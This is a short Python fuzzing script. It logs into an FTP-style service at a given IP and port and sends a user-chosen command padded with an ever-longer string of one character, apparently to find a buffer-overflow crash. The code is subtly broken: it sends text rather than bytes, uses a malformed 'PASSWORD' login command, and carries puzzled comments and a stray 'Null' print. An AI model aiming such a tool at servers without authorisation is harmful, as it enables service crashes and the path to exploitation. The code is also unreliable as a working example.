import socket 
import sys 

if len(sys.argv) != 6: 
    print("usage : ./Fuzzing.py [IP] [PORT] [PAYLOAD] [INTERVAL] [MAXIMUM] ")
    sys.exit() 
    
target = str(sys.argv[1])
port = int(sys.argv[2])
char = str(sys.argv[3])
interval = int(sys.argv[4])
i = int(sys.argv[4])  # Corrected assignment here
maximum = int(sys.argv[5])  # Corrected argument index

user = input("Username : ")
password = input("Password : ") 
command = input("Command : ")

while i <= maximum:
    try:
        payload = command + " " + (char * i)
        print("Send : " + str(i) + " Payload : " + char + " Destination")
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.recv(1024)
        s.send('USER ' + user + "\r\n")
        s.recv(1024)
        s.send("PASSWORD" + password + "\r\n")
        s.recv(1024)
        s.send(payload + "\r\n")
        s.send('QUIT\r\n')
        s.recv(1024)
        s.close()
        i = i + interval
    except Exception as e:  # Catch specific exceptions here
        print("Error:", e)
    print("Null")  # Not sure what this is for
